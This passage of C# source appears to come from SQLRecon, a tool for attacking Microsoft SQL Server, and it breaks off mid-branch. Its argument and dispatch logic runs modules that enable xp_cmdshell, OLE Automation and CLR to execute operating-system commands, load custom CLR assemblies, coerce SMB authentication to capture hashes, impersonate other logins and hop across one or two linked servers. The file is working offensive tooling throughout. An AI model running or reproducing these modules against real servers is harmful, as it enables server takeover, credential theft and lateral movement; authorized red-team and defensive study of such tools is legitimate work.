using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using SQLRecon.Modules;

namespace SQLRecon.Auth
{
    public class ArgumentLogic
    {
        //variables used for command line arguments and general program execution
        private static SqlConnection con = null;
        private static String authType = "";
        private static String sqlServer = "";
        private static String port = "1433";        
        private static String database = "";
        private static String domain = "";
        private static String user = "";
        private static String pass = "";
        private static String module = "";
        private static String option = "";
        private static String linkedSqlServer = "";
        private static String linkedSqlServer2 = "";
        private static String impersonate = "";
        private static String function = "";

        public void AuthenticationType(Dictionary<string, string> argDict)
        {
            // if authentication type is not given, display help and return
            if (!argDict.ContainsKey("a"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply an authentication type (-a Windows, -a Local or -a Azure)");
                return;
            }

            // if the authentication type is Windows, make sure that sql server, database and module has been set
            if (argDict["a"].ToLower().Equals("windows") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("m"))
            {
                authType = argDict["a"].ToLower();
                sqlServer = argDict["s"].ToLower();
                database = argDict["d"].ToLower();

                // optional argument for port, defaults to 1433
                if (argDict.ContainsKey("r"))
                {
                    port = argDict["r"];
                }

                WindowsAuth WindowsAuth = new WindowsAuth();
                con = WindowsAuth.Send(sqlServer + "," + port, database);
                EvaluateTheArguments(argDict);
            }
            else if (argDict["a"].ToLower().Equals("windows"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d) and module (-m)");
                return;
            }

            /* if authentication type is local, make sure that:
                - the SQL server
                - database
                - username 
                - and password has been given, otherwise display help and return
            */
            if (argDict["a"].ToLower().Equals("local") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("u") && argDict.ContainsKey("p") && argDict.ContainsKey("m"))
            {
                authType = argDict["a"].ToLower();
                sqlServer = argDict["s"].ToLower();
                database = argDict["d"].ToLower();
                user = argDict["u"];
                pass = argDict["p"];
                
                // optional argument for port, defaults to 1433
                if (argDict.ContainsKey("r"))
                {
                    port = argDict["r"];
                }

                LocalAuth LocalAuth = new LocalAuth();
                con = LocalAuth.Send(sqlServer + "," + port, database, user, pass);
                EvaluateTheArguments(argDict); 
            }
            else if (argDict["a"].ToLower().Equals("local"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d), username (-u), password (-p) and module (-m)");
                return;
            }

            /* if authentication type is azure, make sure that:
                - the SQL server
                - database
                - username 
                - domain
                - and password has been given, otherwise display help and return
            */
            if (argDict["a"].ToLower().Equals("azure") && argDict.ContainsKey("s") && argDict.ContainsKey("d") && argDict.ContainsKey("r") && argDict.ContainsKey("u") && argDict.ContainsKey("p") && argDict.ContainsKey("m"))
            {
                if (!argDict["r"].Contains("."))
                {
                    Console.WriteLine("\n[!] ERROR: Domain (-r) must be the fully qualified domain name (domain.com)");
                    return;
                }
                else
                {
                    authType = argDict["a"].ToLower();
                    sqlServer = argDict["s"].ToLower();
                    database = argDict["d"].ToLower();
                    domain = argDict["r"];
                    user = argDict["u"];
                    pass = argDict["p"];
                    AzureAuth AzureAuth = new AzureAuth();
                    con = AzureAuth.Send(sqlServer, database, domain, user, pass);
                    EvaluateTheArguments(argDict);
                }
            }
            else if (argDict["a"].ToLower().Equals("azure"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SQL server (-s), database (-d), domain (-r), username (-u), password (-p) and module (-m)");
                return;
            }
        }

        // EvaluateTheArguments
        public static void EvaluateTheArguments(Dictionary<string, string> argDict)
        {
            // First check to see if the connection string is null
            if (con == null)
            {
                return;
            }

            // ##############################################
            // ###### Standard Single SQL Server Logic ######
            // ##############################################
            // if the module type is query, then set the module to query and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("query") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a query (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("tables"))
            {
                if (!argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a database on the SQL server (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                }
            }
            else if (argDict["m"].ToLower().Equals("smb") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a SMB path (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("xpcmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("olecmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("agentcmd") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a command (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("search") && !argDict.ContainsKey("o"))
            {
                Console.WriteLine("\n[!] ERROR: Must supply a keyword (-o)");
                module = argDict["m"].ToLower();
                return;
            }
            else if (argDict["m"].ToLower().Equals("clr"))
            {
                if (!argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply path to DLL (-o) and function name (-f)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    function = argDict["f"];
                }
            }
            else if (argDict.ContainsKey("o"))
            {
                module = argDict["m"].ToLower();
                option = argDict["o"];
            }
            else
            {
                module = argDict["m"].ToLower();
            }

            // #####################################
            // ###### Linked SQL Server Logic ######
            // #####################################
            // if the module type is lquery, then set the linkedSqlServer, set the module to lquery and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("lquery"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and query (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            // check linked databases on remote server via link
            if (argDict["m"].ToLower().Equals("llinks"))
            {
                if (!argDict.ContainsKey("l") )
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) ");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ltables"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and database on the linked SQL server (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lsmb"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and SMB path (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lxpcmd"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lolecmd"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenablerpc"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to enable RPC on");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisablerpc"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) you want to disable RPC on");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldatabases"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lwhoami"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("llwhoami"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("x"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and a 2nd link (-x)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                    linkedSqlServer2 = argDict["x"];
                }
            }
            //
            //2x hop clr attack
            else if (argDict["m"].ToLower().Equals("llxload"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("x"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and a 2nd link (-x)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                    linkedSqlServer2 = argDict["x"];
                }
            }
            else if (argDict["m"].ToLower().Equals("llxx"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("x") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and a 2nd link (-x) and command option (-o) ");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                    linkedSqlServer2 = argDict["x"];
                }
            }
            else if (argDict["m"].ToLower().Equals("llxclean"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("x"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and a 2nd link (-x)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                    linkedSqlServer2 = argDict["x"];
                }
            }

            //1x hop clr attack 
            else if (argDict["m"].ToLower().Equals("xclrloadat"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("xclrxat"))
            {
                if (!argDict.ContainsKey("l") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("xclrcleanat"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lroles"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenablexp"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisablexp"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenableole"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisableole"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lenableclr"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ldisableclr"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else if (argDict["m"].ToLower().Equals("lagentstatus"))
            {
                if (!argDict.ContainsKey("l"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a linked SQL server (-l)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    linkedSqlServer = argDict["l"];
                }
            }
            else
            {
                module = argDict["m"].ToLower();
            }

            // ############################################
            // ###### Impersonation SQL Server Logic ######
            // ############################################
            // if the module type is impersonate, then set the sqlServer, set the module to impersonate and set option to the actual sql query
            if (argDict["m"].ToLower().Equals("iquery"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and query (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ixpcmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iwhoami"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienablexp"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisablexp"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iolecmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iagentcmd"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iclr"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o") || !argDict.ContainsKey("f"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i),  path to DLL (-o) and function name (-f)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    function = argDict["f"];
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienableole"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisableole"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("ienableclr"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("idisableclr"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("iagentstatus"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("xclrload"))
            {
                if (!argDict.ContainsKey("i") )
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) ");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }
            else if (argDict["m"].ToLower().Equals("xclrx"))
            {
                if (!argDict.ContainsKey("i") || !argDict.ContainsKey("o"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) and command (-o)");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    option = argDict["o"];
                    impersonate = argDict["i"];
                }
            }

            else if (argDict["m"].ToLower().Equals("xclrclean"))
            {
                if (!argDict.ContainsKey("i"))
                {
                    Console.WriteLine("\n[!] ERROR: Must supply a user to impersonate (-i) ");
                    module = argDict["m"].ToLower();
                    return;
                }
                else
                {
                    module = argDict["m"].ToLower();
                    impersonate = argDict["i"];
                }
            }


            else
            {
                module = argDict["m"].ToLower();
            }

            // this is effectively a huge module switch

            // ##########################################
            // ########## Standard SQL Modules ##########
            // ##########################################

            SQLQuery sqlQuery = new SQLQuery();

            // whoami
            if (module.Equals("whoami"))
            {
                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteQuery(con, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteQuery(con, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Roles: ");
                Roles Roles = new Roles();
                Roles.Server(con, "public");
                Roles.Server(con, "sysadmin");
            }
            // databases
            else if (module.Equals("databases"))
            {
                Console.Out.WriteLine("\n[+] Databases in " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, "SELECT dbid, name, crdate, filename FROM master.dbo.sysdatabases;"));
            }
            // tables 
            else if (module.Equals("tables"))
            {
                Console.Out.WriteLine("\n[+] Tables in " + option + ":" + sqlQuery.ExecuteCustomQuery(con, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));
            }
            // query
            else if (module.Equals("query"))
            {
                Console.Out.WriteLine("\n[+] Executing: " + option + " on " + sqlServer + ":" + sqlQuery.ExecuteCustomQuery(con, option));
            }
            // search 
            else if (module.Equals("search"))
            {
                Console.Out.WriteLine("\n[+] Searching for columns containing " + option + " in " + database + ": " + sqlQuery.ExecuteCustomQuery(con, "select table_name, column_name from INFORMATION_SCHEMA.COLUMNS where column_name like '%" + option + "%';"));
            }
            // smb
            else if (module.Equals("smb"))
            {
                Console.Out.WriteLine("\n[+] Sending SMB Request to: " + option);
                SMB smb = new SMB();
                smb.CaptureHash(con, option);
            }
            // impersonate
            else if (module.Equals("impersonate"))
            {
                Console.Out.WriteLine("\n[+] Enumerating accounts that can be impersonated on " + sqlServer + ":");
                Impersonate impersonate = new Impersonate();
                impersonate.Check(con);
            }
            // enablexp
            else if (module.Equals("enablexp"))
            {
                Console.Out.WriteLine("\n[+] Enabling xp_cmdshell on: " + sqlServer + ":");
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "1");
            }
            // disablexp
            else if (module.Equals("disablexp"))
            {
                Console.Out.WriteLine("\n[+] Disabling xp_cmdshell on: " + sqlServer + ":");
                Configure config = new Configure();
                config.EnableDisable(con, "xp_cmdshell", "0");
            }
            // xpcmd
            else if (module.Equals("xpcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer + ":");
                XPCmdShell XPCmdShell = new XPCmdShell();
                XPCmdShell.StandardCommand(con, option);
            }
            // enableole
            else if (module.Equals("enableole"))
            {
                Console.Out.WriteLine("\n[+] Enabling Ole Automation Procedures on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "1");
            }
            // disableole
            else if (module.Equals("disableole"))
            {
                Console.Out.WriteLine("\n[+] Disabling Ole Automation Procedures on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "Ole Automation Procedures", "0");
            }
            // olecmd
            else if (module.Equals("olecmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer);
                OLE ole = new OLE();
                ole.StandardCommand(con, option);
            }
            // enableclr
            else if (module.Equals("enableclr"))
            {
                Console.Out.WriteLine("\n[+] Enabling CLR integration on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "1");
            }
            //  disableclr
            else if (module.Equals("disableclr"))
            {
                Console.Out.WriteLine("\n[+] Disabling CLR integration on: " + sqlServer);
                Configure config = new Configure();
                config.EnableDisable(con, "clr enabled", "0");
            }
            // clr
            else if (module.Equals("clr"))
            {
                Console.Out.WriteLine("\n[+] Performing CLR custom assembly attack on: " + sqlServer);
                CLR clr = new CLR();
                clr.Standard(con, option, function);
            }
            //agentstatus
            else if (module.Equals("agentstatus"))
            {
                AgentJobs aj = new AgentJobs();
                aj.AgentStatus(con, sqlServer);
            }
            else if (module.Equals("agentcmd"))
            {
                Console.Out.WriteLine("\n[+] Executing '" + option + "' on " + sqlServer + ":");
                AgentJobs aj = new AgentJobs();
                aj.AgentCommand(con, sqlServer, option);
            }
            // links
            else if (module.Equals("links"))
            {
                Console.Out.WriteLine("\n[+] Additional Links on " + sqlServer + ": " + sqlQuery.ExecuteCustomQuery(con, "SELECT name, provider, data_source FROM sys.servers WHERE is_linked = 1;"));

            }
            else if (module.Equals("llinks"))
            {
                Console.Out.WriteLine("\n[+] Additional Links on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteCustomQuery(con, "EXEC ('sp_linkedservers') AT " + linkedSqlServer));

            }
            // ########################################
            // ########## Linked SQL Modules ##########
            // ########################################

            // ldatabases
            else if (module.Equals("ldatabases"))
            {
                Console.Out.WriteLine("\n[+] Databases on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "SELECT dbid, name, crdate, filename from master.dbo.sysdatabases;"));
            }
            // ltables
            else if (module.Equals("ltables"))
            {
                Console.Out.WriteLine("\n[+] Tables in database " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, "select * from " + option + ".INFORMATION_SCHEMA.TABLES;"));

            }
            // lquery
            else if (module.Equals("lquery"))
            {
                Console.Out.WriteLine("\n[+] Executing " + option + " on " + linkedSqlServer + " via " + sqlServer + ": " + sqlQuery.ExecuteLinkedCustomQuery(con, linkedSqlServer, option));
            }
            // lsmb
            else if (module.Equals("lsmb"))
            {
                Console.Out.WriteLine("\n[+] Sending SMB Request from " + linkedSqlServer + " to " + option + " via " + sqlServer);
                SMB smb = new SMB();
                smb.CaptureLinkedHash(con, linkedSqlServer, option);
            }
            // lwhoami
            else if (module.Equals("lwhoami"))
            {

                Console.Out.WriteLine("\n[+] Determining user permissions on " + linkedSqlServer + " via " + sqlServer + ":");




                Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;"));
                Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT USER_NAME(); "));

                Console.Out.WriteLine("\n[+] Roles: ");
                Roles Roles = new Roles();
                Roles.Linked(con, "public", linkedSqlServer);
                Roles.Linked(con, "sysadmin", linkedSqlServer);
            }
            // llwhoami   -x for 2nd linkd server
            else if (module.Equals("llwhoami"))
            {

                Console.Out.WriteLine("\n[+] -> " + sqlServer + " -> " + linkedSqlServer + " -> " + linkedSqlServer2);

                Console.Out.WriteLine("\n[+] Determining user permissions on " + linkedSqlServer2 + " via " + sqlServer + " and " + linkedSqlServer + " links:");

                //
                //


                //Console.Out.WriteLine("\n[+] whoami on " + linkedSqlServer2 + ": " + sqlQuery.ExecuteQuery(con, "select myuser from openquery(\"dc01\", 'select myuser from openquery(\"appsrv01\", ''select SYSTEM_USER as myuser'') ' ) "   )) ;
                Console.Out.WriteLine("\n[+] whoami on " + linkedSqlServer2 + ": " + sqlQuery.ExecuteQuery(con, "select myuser from openquery(\"" + linkedSqlServer + "\", 'select myuser from openquery(\"" + linkedSqlServer2 + "\", ''select SYSTEM_USER as myuser'') ' ) "));

                Console.Out.WriteLine("\n[+] mapped on " + linkedSqlServer2 + " to: " + sqlQuery.ExecuteQuery(con, "select myuser from openquery(\"" + linkedSqlServer + "\", 'select myuser from openquery(\"" + linkedSqlServer2 + "\", ''select USER_NAME() as myuser'') ' ) "));


                Console.Out.WriteLine("\n[+] check member of public role " + linkedSqlServer2 + ": " + sqlQuery.ExecuteQuery(con, "select myuser from openquery(\"" + linkedSqlServer + "\", 'select myuser from openquery(\"" + linkedSqlServer2 + "\", ''SELECT IS_SRVROLEMEMBER(''''public'''') as myuser'') ' ) "));

                Console.Out.WriteLine("\n[+] check sysadmin " + linkedSqlServer2 + ": " + sqlQuery.ExecuteQuery(con, "select myuser from openquery(\"" + linkedSqlServer + "\", 'select myuser from openquery(\"" + linkedSqlServer2 + "\", ''SELECT IS_SRVROLEMEMBER(''''sysadmin'''') as myuser'') ' ) "));


                

                //SELECT IS_SRVROLEMEMBER('sysadmin')
                //Console.Out.WriteLine("\n[+] Logged in as: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT SYSTEM_USER;"));
                // Console.Out.WriteLine("\n[+] Mapped to the user: " + sqlQuery.ExecuteLinkedQuery(con, linkedSqlServer, "SELECT USER_NAME(); "));

                // Console.Out.WriteLine("\n[+] Roles: ");
                //Roles Roles = new Roles();
                //Roles.Linked(con, "public", linkedSqlServer);
                //Roles.Linked(con, "sysadmin", linkedSqlServer);
            }
            // lenablerpc
            else if (module.Equals("lenablerpc"))
            {
                Console.Out.WriteLine("\n[+] Enabling RPC on: " + linkedSqlServer);
                Configure config = new Configure();
                config.EnableDisableRpc(con, "1", linkedSqlServer);
            }
            //  ldisablerpc
            else if (module.Equals("ldisablerpc"))
            {
                Console.Out.WriteLine("\n[+] Disabling RPC on: " + linkedSqlServer);
